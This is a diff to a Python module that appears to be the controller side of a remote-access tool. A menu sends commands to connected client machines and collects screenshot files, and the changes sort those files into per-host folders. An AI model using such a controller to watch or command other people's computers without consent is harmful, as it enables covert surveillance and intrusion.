@@ -1,5 +1,7 @@
+import os
 import time
 import socket
+import shutil
 from termcolor import colored
 
 
@@ -18,7 +20,7 @@ def freestyle_menu():
     return
 
 
-def freestyle(con):
+def freestyle(con, root, tmp_availables, clients):
     while True:
         freestyle_menu()
         try:
@@ -38,6 +40,22 @@ def freestyle(con):
                 size = bytes_to_number(size)
                 current_size = 0
                 buffer = b""
+                filename = str(filename).strip("b'")
+
+                # Create a directory with host's name if not already exists.
+                for item in tmp_availables:
+                    for conKey, ipValue in clients.items():
+                        for ipKey in ipValue.keys():
+                            if item[1] == ipKey:
+                                ipval = item[1]
+                                host = item[2]
+                                user = item[3]
+                                path = os.path.join(root, host)
+                                try:
+                                    os.makedirs(path)
+
+                                except FileExistsError:
+                                    pass
 
                 # Fetch file content
                 try:
@@ -67,6 +85,11 @@ def freestyle(con):
                 con.send(msg)
                 ans = con.recv(1024).decode()
                 print(f"[{colored('V', 'green')}]{ans}")
+
+                # Move screenshot file to directory
+                src = os.path.abspath(filename)
+                dst = fr"{path}"
+                shutil.move(src, dst)
 
             elif int(choice) == 2:
                 con.send("cmd".encode())
@@ -83,6 +106,22 @@ def freestyle(con):
                 size = bytes_to_number(size)
                 current_size = 0
                 buffer = b""
+                filename = str(filename).strip("b'")
+
+                # Create a directory with host's name if not already exists.
+                for item in tmp_availables:
+                    for conKey, ipValue in clients.items():
+                        for ipKey in ipValue.keys():
+                            if item[1] == ipKey:
+                                ipval = item[1]
+                                host = item[2]
+                                user = item[3]
+                                path = os.path.join(root, host)
+                                try:
+                                    os.makedirs(path)
+
+                                except FileExistsError:
+                                    pass
 
                 # Fetch file content
                 try:
@@ -112,6 +151,11 @@ def freestyle(con):
                 con.send(msg)
                 ans = con.recv(1024).decode()
                 print(f"[{colored('V', 'green')}]{ans}")
+
+                # Move screenshot file to directory
+                src = os.path.abspath(filename)
+                dst = fr"{path}"
+                shutil.move(src, dst)
 
             elif int(choice) == 0:
                 con.send("back".encode())
